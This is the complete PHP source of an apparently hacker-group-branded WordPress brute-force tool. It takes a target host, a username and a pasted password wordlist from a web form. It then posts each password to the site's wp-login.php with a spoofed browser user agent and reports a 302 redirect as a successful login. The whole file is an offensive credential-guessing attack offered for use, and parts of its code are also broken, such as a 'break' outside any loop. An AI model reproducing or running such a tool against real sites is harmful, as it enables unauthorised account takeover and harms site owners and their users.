<?php
 
/*!
WordPress Brute_Force v1.0
Author: AdeRoot
date: 08/09/2015
Greetz:Bruce_Dickinson, TheShow, HackerRage
!*/
 
set_time_limit(0);
error_reporting(0);
 
class Wp{
 
        private $host;
        private $user;
        private $open;
        private $lista;
 
  public function banner() {
   echo("
    <html>
    <head>
    <title>Wp-Brute Force</title>
    <style type='text/css'>
    body{
        font-family:'Times New Roman';
        font-size:20px;
        background-color:#000000;
        color:#FFA500;
        font-style:Italic;
 
    }
 
    .ext{
        color: #00FFFF;
    }
 
    .area{
        width:400px;
        height:350px;
        resize:none;
    }
 
    </style>
    </head>
    <body>
    <h1><center>WordPress Brute_Force v1.0</center></h1>
    <form action='' method='POST'>
    <div align='right' class='ext'>Author: AdeRoot<br>
    IBMbLack CreW</div>
    Host:<input type='text' name='host' size='40'><br>
    User:<input type='text' name='user'  size='25'><br>
    <center>Wordlist</center>
    <center><textarea class='area' name='lista'></textarea><br><br><center>
    <center><input type='Submit' value='Start'></center>
    </form>
    </body>
   </html>");
}
 
    public function extract_post() {
         $this->host = $_POST["host"];
         $this->user = $_POST["user"];
         $this->open = $_POST["lista"];
       }
 
       public function Xregex() {
         if(preg_match("@/wp-login.php@", $this->host)) {
             return true;
         } else {
            $this->host = $_POST["host"]."/wp-login.php";
         }
     }
 
      public function brute() {
           $lista = array_filter(explode("\n", $this->open));
           foreach($lista as $this->lista) {
           for($i=0; $i < count($this->lista); $i++) {
                        $this->Xcurl();
                     }
              }
       }
 
        private function cool() {
            echo "Host:"."<font color='white'>{$this->host}</font>";
            echo " User:"."<font color='white'>{$this->user}</font>";
            echo " Pass:"."<font color='white'>{$this->lista}</font>";
        }
 
        private function Xcurl() {
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $this->host);
            curl_setopt($curl, CURLOPT_USERAGENT, $this->useragent);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, "log=$this->user&pwd=$this->lista&wp-submit=Login&redirect_to=$this->host/wp-admin/");
            $exec = curl_exec($curl);
            $http = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            $this->cool();
            if($http == 302) {
                 echo "<font color='#00FF00'> [+] Successfull!!</font><br>";
                 break;
            } else {
                echo "<font color='red'>Failed</font><br>";
            }
                curl_close($curl);
        }
}
 
$wp = new Wp();
$wp->useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0";
$wp->banner();
$wp->extract_post();
$wp->Xregex();
$wp->brute();
?>
